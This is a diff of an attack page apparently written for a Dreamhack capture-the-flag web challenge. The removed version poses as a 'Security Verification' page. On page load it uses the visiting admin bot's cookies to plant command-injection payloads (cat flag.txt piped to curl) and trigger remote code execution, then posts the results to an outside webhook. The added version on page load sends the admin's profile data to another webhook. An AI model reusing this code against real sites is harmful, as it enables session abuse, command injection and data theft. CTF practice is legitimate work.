@@ -1,292 +1,38 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
-    <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            margin: 20px;
-            background-color: #f8f9fa;
-        }
-        .container { 
-            max-width: 600px; 
-            margin: 0 auto; 
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        .loading { 
-            text-align: center; 
-            color: #666; 
-        }
-        .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #007bff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .status {
-            margin: 10px 0;
-            padding: 10px;
-            border-radius: 4px;
-            font-size: 14px;
-        }
-        .success { background-color: #d4edda; color: #155724; }
-        .error { background-color: #f8d7da; color: #721c24; }
-        .info { background-color: #d1ecf1; color: #0c5460; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2>Security Verification</h2>
-        <div class="loading">
-            <div class="spinner"></div>
-            <p>Performing security checks...</p>
-        </div>
+<!-- 당신의 atk.html 페이지에서 -->
+<script>
+async function getAdminInfo() {
+    try {
+        // Admin 봇이 방문했을 때 자신의 프로필 정보 수집
+        const profileResp = await fetch('http://127.0.0.1:5555/api/profile', {
+            credentials: 'include'
+        });
         
-        <div id="status-log"></div>
-        
-        <div id="complete" style="display:none;">
-            <div class="status success">
-                ✓ Security verification completed successfully
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // Configuration - try multiple possible URLs
-        const POSSIBLE_URLS = [
-            'http://127.0.0.1:5555',
-            'http://localhost:5555', 
-            'http://34.59.119.124:17005',
-            'http://flagguessr:5555'
-        ];
-        let FLAGGUESSR_BASE = POSSIBLE_URLS[0];
-        const WEBHOOK_URL = 'https://rsqwmeg.request.dreamhack.games';
-        
-        let statusLog = document.getElementById('status-log');
-        
-        function addStatus(message, type = 'info') {
-            const div = document.createElement('div');
-            div.className = `status ${type}`;
-            div.textContent = `${new Date().toLocaleTimeString()} - ${message}`;
-            statusLog.appendChild(div);
-            console.log(`[${type.toUpperCase()}] ${message}`);
-        }
-        
-        async function sendToWebhook(data) {
-            const payload = {
-                timestamp: new Date().toISOString(),
-                source: 'flagguessr_admin_bot',
-                url: window.location.href,
-                user_agent: navigator.userAgent,
-                data: data
+        if (profileResp.ok) {
+            const adminProfile = await profileResp.json();
+            
+            // Webhook으로 Admin 정보 전송
+            const adminInfo = {
+                admin_username: adminProfile.username,
+                admin_user_id: adminProfile.user_id,
+                admin_display_name: adminProfile.display_name,  // 🎯 이것!
+                admin_user_kind: adminProfile.user_kind
             };
             
-            try {
-                // Method 1: POST request
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload),
-                    mode: 'no-cors'
-                });
-                
-                // Method 2: GET request with data in URL
-                const base64Data = btoa(JSON.stringify(data)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
-                await fetch(`${WEBHOOK_URL}?t=${Date.now()}&d=${base64Data}`, {
-                    method: 'GET',
-                    mode: 'no-cors'
-                });
-                
-                addStatus('Data sent to webhook', 'success');
-                return true;
-            } catch (error) {
-                addStatus(`Webhook failed: ${error.message}`, 'error');
-                return false;
-            }
-        }
-        
-        async function tryMultipleUrls(endpoint, options = {}) {
-            for (let i = 0; i < POSSIBLE_URLS.length; i++) {
-                const baseUrl = POSSIBLE_URLS[i];
-                try {
-                    addStatus(`Trying ${baseUrl}${endpoint}`, 'info');
-                    const response = await fetch(`${baseUrl}${endpoint}`, {
-                        ...options,
-                        credentials: 'include'
-                    });
-                    
-                    if (response.ok || response.status < 500) {
-                        FLAGGUESSR_BASE = baseUrl; // Update successful base URL
-                        addStatus(`Success with ${baseUrl}`, 'success');
-                        return response;
-                    }
-                } catch (error) {
-                    addStatus(`Failed ${baseUrl}: ${error.message}`, 'error');
-                }
-            }
-            throw new Error('All URLs failed');
-        }
-            try {
-                addStatus('Starting admin exploitation...', 'info');
-                
-                const results = {
-                    exploitation_started: true,
-                    steps: []
-                };
-                
-                // Step 1: Get admin profile
-                try {
-                    addStatus('Step 1: Getting admin profile', 'info');
-                    const profileResp = await fetch(`${FLAGGUESSR_BASE}/api/profile`, {
-                        credentials: 'include'
-                    });
-                    
-                    if (profileResp.ok) {
-                        const profileData = await profileResp.json();
-                        results.admin_profile = profileData;
-                        results.steps.push('profile_obtained');
-                        addStatus(`Admin profile: ${profileData.username} (${profileData.user_kind === 1 ? 'ADMIN' : 'USER'})`, 'success');
-                    } else {
-                        results.steps.push('profile_failed');
-                        addStatus('Failed to get admin profile', 'error');
-                    }
-                } catch (e) {
-                    results.steps.push(`profile_error: ${e.message}`);
-                    addStatus(`Profile error: ${e.message}`, 'error');
-                }
-                
-                // If we have a working base URL, continue with exploitation
-                if (results.successful_base_url) {
-                    // Step 2: Set malicious profile for command injection
-                    try {
-                        addStatus('Step 2: Setting malicious profile', 'info');
-                        
-                        // Multiple command injection payloads to try
-                        const payloads = [
-                            `admin_exploit; cat /app/flag.txt; curl -X POST --data "FLAG1:$(cat /app/flag.txt)" ${WEBHOOK_URL}`,
-                            `admin_exploit; cat ./flag.txt; curl -X POST --data "FLAG2:$(cat ./flag.txt)" ${WEBHOOK_URL}`,
-                            `admin_exploit; find / -name "flag.txt" -exec cat {} \\; -exec curl -X POST --data "FOUND:$(cat {})" ${WEBHOOK_URL} \\;`,
-                            `admin_exploit; ls -la /app/; curl -X POST --data "LISTING:$(ls -la /app/)" ${WEBHOOK_URL}`
-                        ];
-                        
-                        for (let i = 0; i < payloads.length; i++) {
-                            const payload = payloads[i];
-                            addStatus(`Trying payload ${i + 1}/${payloads.length}`, 'info');
-                            
-                            const profileUpdateResp = await fetch(`${FLAGGUESSR_BASE}/api/profile`, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify({
-                                    description: payload
-                                }),
-                                credentials: 'include'
-                            });
-                            
-                            if (profileUpdateResp.ok) {
-                                results.steps.push(`payload_${i + 1}_set`);
-                                addStatus(`Payload ${i + 1} set successfully`, 'success');
-                                
-                                // Step 3: Trigger certificate generation for command injection
-                                await new Promise(resolve => setTimeout(resolve, 500)); // Small delay
-                                
-                                addStatus(`Triggering certificate for payload ${i + 1}`, 'info');
-                                
-                                const certResp = await fetch(`${FLAGGUESSR_BASE}/api/certificate`, {
-                                    credentials: 'include'
-                                });
-                                
-                                if (certResp.ok) {
-                                    results.steps.push(`cert_${i + 1}_generated`);
-                                    addStatus(`Certificate ${i + 1} generated - RCE executed!`, 'success');
-                                    
-                                    // Try to get the certificate content
-                                    const certBlob = await certResp.blob();
-                                    if (certBlob.size > 0) {
-                                        results[`cert_${i + 1}_size`] = certBlob.size;
-                                    }
-                                } else {
-                                    results.steps.push(`cert_${i + 1}_failed`);
-                                    addStatus(`Certificate ${i + 1} generation failed`, 'error');
-                                }
-                            } else {
-                                results.steps.push(`payload_${i + 1}_failed`);
-                                addStatus(`Payload ${i + 1} setting failed`, 'error');
-                            }
-                            
-                            // Small delay between attempts
-                            await new Promise(resolve => setTimeout(resolve, 1000));
-                        }
-                        
-                    } catch (e) {
-                        results.steps.push(`exploitation_error: ${e.message}`);
-                        addStatus(`Exploitation error: ${e.message}`, 'error');
-                    }
-                    
-                    // Step 4: Try to get leaderboard info
-                    try {
-                        addStatus('Step 4: Getting leaderboard', 'info');
-                        const leaderboardResp = await fetch(`${FLAGGUESSR_BASE}/api/leaderboard`, {
-                            credentials: 'include'
-                        });
-                        
-                        if (leaderboardResp.ok) {
-                            const leaderboardData = await leaderboardResp.json();
-                            results.leaderboard = leaderboardData;
-                            results.steps.push('leaderboard_obtained');
-                            addStatus('Leaderboard data obtained', 'success');
-                        }
-                    } catch (e) {
-                        results.steps.push(`leaderboard_error: ${e.message}`);
-                        addStatus(`Leaderboard error: ${e.message}`, 'error');
-                    }
-                }
-                
-                // Send all results
-                addStatus('Sending results to webhook...', 'info');
-                await sendToWebhook(results);
-                
-                // Show completion
-                document.querySelector('.loading').style.display = 'none';
-                document.getElementById('complete').style.display = 'block';
-                addStatus('Exploitation completed', 'success');
-                
-            } catch (error) {
-                addStatus(`Critical error: ${error.message}`, 'error');
-                await sendToWebhook({
-                    error: error.message,
-                    stack: error.stack
-                });
-            }
-        }
-        
-        // Start exploitation when page loads
-        window.onload = function() {
-            addStatus('Page loaded, starting in 2 seconds...', 'info');
-            setTimeout(exploitAdmin, 2000);
-        };
-        
-        // Also try when document is ready
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', function() {
-                setTimeout(exploitAdmin, 3000);
+            await fetch('https://atefpeg.request.dreamhack.games', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'admin_info_extracted',
+                    data: adminInfo
+                }),
+                mode: 'no-cors'
             });
         }
-    </script>
-</body>
-</html>
+    } catch (e) {
+        console.log('Failed to get admin info:', e);
+    }
+}
+
+// 페이지 로드 시 실행
+window.onload = getAdminInfo;
+</script>
